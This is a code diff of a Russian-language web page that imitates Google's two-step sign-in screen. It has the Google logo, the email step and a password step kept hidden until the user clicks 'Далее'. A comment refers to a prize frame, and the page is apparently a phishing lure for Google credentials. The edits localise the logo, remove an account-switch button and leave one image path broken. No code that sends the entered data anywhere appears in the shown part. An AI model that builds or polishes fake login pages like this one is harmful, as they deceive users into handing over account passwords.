@@ -30,6 +30,7 @@
             position: relative;
         }
 
+        /* Анимированная рамка для призов */
         .auth-container::before {
             content: '';
             position: absolute;
@@ -68,6 +69,7 @@
             color: var(--google-text);
         }
 
+        /* Поле ввода с текстом сверху */
         .input-group {
             position: relative;
             margin-top: 25px;
@@ -135,6 +137,15 @@
             font-size: 14px;
         }
 
+        .lang-footer {
+            position: absolute;
+            bottom: -40px;
+            left: 0;
+            font-size: 12px;
+            color: #000;
+        }
+
+        /* Стили для страницы пароля */
         .account-box {
             display: flex;
             align-items: center;
@@ -153,35 +164,12 @@
             margin-top: 8px;
             color: var(--google-text);
         }
-
-        /* Стили для кнопки смены аккаунта */
-        .account-change {
-            display: flex;
-            align-items: center;
-            font-size: 14px;
-            color: var(--google-gray);
-            cursor: pointer;
-            margin-top: 20px;
-        }
-
-        .account-change img {
-            width: 20px;
-            margin-right: 8px;
-        }
-
-        .lang-footer {
-            position: absolute;
-            bottom: -40px;
-            left: 0;
-            font-size: 12px;
-            color: #000;
-        }
     </style>
 </head>
 <body>
 
 <div class="auth-container" id="step1">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+    <img src="Google.png" alt="Google" class="logo">
     <h1>Вход</h1>
     <p class="subtitle">Используйте аккаунт Google</p>
     
@@ -195,11 +183,6 @@
         <a href="#">Подробнее об использовании гостевого режима</a>
     </div>
 
-    <div class="account-change">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/User_icon_2.svg" alt="Аноним" />
-        <span>Сменить аккаунт</span>
-    </div>
-
     <div class="footer-buttons">
         <button class="btn-text">Создать аккаунт</button>
         <button class="btn-blue" onclick="nextStep()">Далее</button>
@@ -208,12 +191,13 @@
     <div class="lang-footer">Русский</div>
 </div>
 
+<!-- Страница пароля (скрыта по умолчанию) -->
 <div class="auth-container" id="step2" style="display:none;">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+    <img src="Google.png" alt="Google" class="logo">
     <h1>Добро пожаловать!</h1>
     
     <div class="account-box">
-        <img src="https://www.gstatic.com/images/branding/product/2x/avatar_circle_blue_512dp.png" width="20" style="margin-right:8px">
+        <img src="www.gstatic.com" width="20" style="margin-right:8px">
         <span id="displayEmail">user@gmail.com</span>
     </div>
 
